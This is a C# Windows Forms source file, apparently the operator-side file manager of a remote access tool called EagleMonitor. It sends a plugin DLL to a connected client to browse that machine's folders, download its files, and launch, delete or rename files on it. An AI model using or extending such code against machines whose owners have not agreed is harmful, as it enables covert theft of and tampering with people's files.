using EagleMonitor.Networking;
using EagleMonitor.Utils;
using EagleMonitor.Controls;
using PacketLib;
using PacketLib.Packet;
using System;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace EagleMonitor.Forms
{
    public partial class FileManagerForm : FormPattern
    {
        private ClientHandler clientHandler { get; set; }
        public Dictionary<string, DownloadFileForm> files;
        internal FileManagerForm(ClientHandler clientHandler)
        {
            this.clientHandler = clientHandler;
            this.files = new Dictionary<string,DownloadFileForm>(); 
            InitializeComponent();
        }

        private void FileManagerForm_Load(object sender, EventArgs e)
        {
            Miscellaneous.Enable(this.fileListView);
        }
        private void diskComboBox_SelectedIndexChanged(object sender, EventArgs e)
        {
            this.labelPath.Text = diskComboBox.Text;
            FileManagerPacket fileManagerPacket = new FileManagerPacket(labelPath.Text)
            {
                plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\FileManager.dll"), 1)
            };
            this.loadingCircle1.Visible = true;
            this.loadingCircle1.Active = true;
            clientHandler.SendPacket(fileManagerPacket);
        }

        private void goToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (fileListView.SelectedItems.Count == 1)
            {
                if (fileListView.SelectedItems[0].Tag.ToString() == "FOLDER")
                {
                    string NewPath = labelPath.Text + fileListView.SelectedItems[0].Text + "\\";
                    this.labelPath.Text = NewPath;
                    FileManagerPacket fileManagerPacket = new FileManagerPacket(labelPath.Text)
                    {
                        plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\FileManager.dll"), 1)
                    };
                    this.loadingCircle1.Visible = true;
                    this.loadingCircle1.Active = true;
                    clientHandler.SendPacket(fileManagerPacket);
                }
            }
        }

        private void backToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.labelPath.Text.Length > 3)
            {
                string[] Splitter = this.labelPath.Text.Split('\\');
                string NewPath = null;
                for (var i = 0; i <= Splitter.Length - 3; i++)
                {
                    NewPath += Splitter[i] + "\\";
                }
                this.labelPath.Text = NewPath;
                FileManagerPacket fileManagerPacket = new FileManagerPacket(labelPath.Text)
                {
                    plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\FileManager.dll"), 1)
                };
                this.loadingCircle1.Visible = true;
                this.loadingCircle1.Active = true;
                clientHandler.SendPacket(fileManagerPacket);
            }
        }

        private void fileListView_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            Task.Run(() =>
            {
                if (fileListView.SelectedItems[0].Tag.ToString() == "FOLDER" && fileListView.SelectedItems.Count == 1)
                {
                    this.loadingCircle1.Visible = true;
                    this.loadingCircle1.Active = true;
                    string NewPath = labelPath.Text + fileListView.SelectedItems[0].Text + "\\";
                    this.labelPath.Text = NewPath;
                    FileManagerPacket fileManagerPacket = new FileManagerPacket(labelPath.Text)
                    {
                        plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\FileManager.dll"), 1)
                    };
                    clientHandler.SendPacket(fileManagerPacket);
                }
                else if (fileListView.SelectedItems[0].Tag.ToString() == "FILE" && fileListView.SelectedItems.Count == 1)
                {
                    string fileToStart = labelPath.Text + fileListView.SelectedItems[0].Text;

                    StartFilePacket startFilePacket = new StartFilePacket(fileToStart)
                    {
                        plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\FileManager.dll"), 1)
                    };
                    clientHandler.SendPacket(startFilePacket);
                }
            });
        }

        private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            //TODO : Download Packet
            //TODO 2 : ProgressBar ?
            foreach (ListViewItem selected in fileListView.SelectedItems)
            {
                if (selected.Tag.ToString() == "FILE")// && fileListView.SelectedItems.Count == 1)
                {
                    string fileToDownload = labelPath.Text + selected.Text;

                    DownloadFileForm downloadFileForm = new DownloadFileForm
                    {
                        Text = fileToDownload
                    };
                    downloadFileForm.label1.Text = Miscellaneous.SplitPath(fileToDownload);
                    downloadFileForm.Show();
                    files.Add(Miscellaneous.SplitPath(fileToDownload), downloadFileForm);

                    DownloadFilePacket dowloadFilePacket = new DownloadFilePacket(fileToDownload)
                    {
                        plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\FileManager.dll"), 1)
                    };
                    clientHandler.SendPacket(dowloadFilePacket);

                }
            }
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem selected in fileListView.SelectedItems)
            {
                if (selected.Tag.ToString() == "FILE")// && fileListView.SelectedItems.Count == 1)
                {
                    string fileToDelete = labelPath.Text + selected.Text;

                    DeleteFilePacket deleteFilePacket = new DeleteFilePacket(fileToDelete, Miscellaneous.SplitPath(fileToDelete))
                    {
                        plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\FileManager.dll"), 1)
                    };
                    clientHandler.SendPacket(deleteFilePacket);
                }
            }
        }

        private void launchToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem selected in fileListView.SelectedItems)
            {
                if (selected.Tag.ToString() == "FILE")// && fileListView.SelectedItems.Count == 1)
                {
                    string fileToStart = labelPath.Text + selected.Text;

                    StartFilePacket startFilePacket = new StartFilePacket(fileToStart)
                    {
                        plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\FileManager.dll"), 1)
                    };
                    clientHandler.SendPacket(startFilePacket);
                }
            }
        }

        private void renameToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem selected in fileListView.SelectedItems)
            {
                if (selected.Tag.ToString() == "FILE")// && fileListView.SelectedItems.Count == 1)
                {
                    string fileToRename = labelPath.Text + selected.Text;

                    string[] S = Microsoft.VisualBasic.Strings.Split(fileToRename, "\\");
                    string[] S1 = S[S.Length - 1].Split('.');
                    string oldName = S[S.Length - 1];
                    string newName = Microsoft.VisualBasic.Interaction.InputBox("The new name : (without extension)") + "." + S1[S1.Length - 1];
                    string newPath = null;
                    for (var H = 0; H <= S.Length - 2; H++)
                    {
                        newPath += S[H] + "\\";
                    }
                    newPath += newName;

                    RenameFilePacket renameFilePacket = new RenameFilePacket(oldName, fileToRename, newName, newPath)
                    {
                        plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\FileManager.dll"), 1)
                    };
                    clientHandler.SendPacket(renameFilePacket);
                }
            }
        }

        private void downloadShortCutStripMenuItem_Click(object sender, EventArgs e)
        {
            this.loadingCircle1.Visible = true;
            this.loadingCircle1.Active = true;
            ShortCutFileManagersPacket shortCutFileManagersPacket = new ShortCutFileManagersPacket(ShortCutFileManagersPacket.ShortCuts.DOWNLOADS)
            {
                plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\FileManager.dll"), 1)
            };
            clientHandler.SendPacket(shortCutFileManagersPacket);
        }
        private void desktopShortCutStripMenuItem_Click(object sender, EventArgs e)
        {
            this.loadingCircle1.Visible = true;
            this.loadingCircle1.Active = true;
            ShortCutFileManagersPacket shortCutFileManagersPacket = new ShortCutFileManagersPacket(ShortCutFileManagersPacket.ShortCuts.DESKTOP)
            {
                plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\FileManager.dll"), 1)
            };
            clientHandler.SendPacket(shortCutFileManagersPacket);
        }

        private void documentsShortCutStripMenuItem_Click(object sender, EventArgs e)
        {
            this.loadingCircle1.Visible = true;
            this.loadingCircle1.Active = true;
            ShortCutFileManagersPacket shortCutFileManagersPacket = new ShortCutFileManagersPacket(ShortCutFileManagersPacket.ShortCuts.DOCUMENTS)
            {
                plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Miscellaneous.GPath + "\\Plugins\\FileManager.dll"), 1)
            };
            clientHandler.SendPacket(shortCutFileManagersPacket);
        }

        private void userProfileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.loadingCircle1.Visible = true;
            this.loadingCircle1.Active = true;
            ShortCutFileManagersPacket shortCutFileManagersPacket = new ShortCutFileManagersPacket(ShortCutFileManagersPacket.ShortCuts.USER_PROFILE)
            {
                plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Miscellaneous.GPath + "\\Plugins\\FileManager.dll"), 1)
            };
            clientHandler.SendPacket(shortCutFileManagersPacket);
        }

        private void closeButton_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void maximizeButton_Click(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Normal)
            {
                this.WindowState = FormWindowState.Maximized;
            }
            else
            {
                this.WindowState = FormWindowState.Normal;
            }
        }

        private void minimizeButton_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }
    }
}
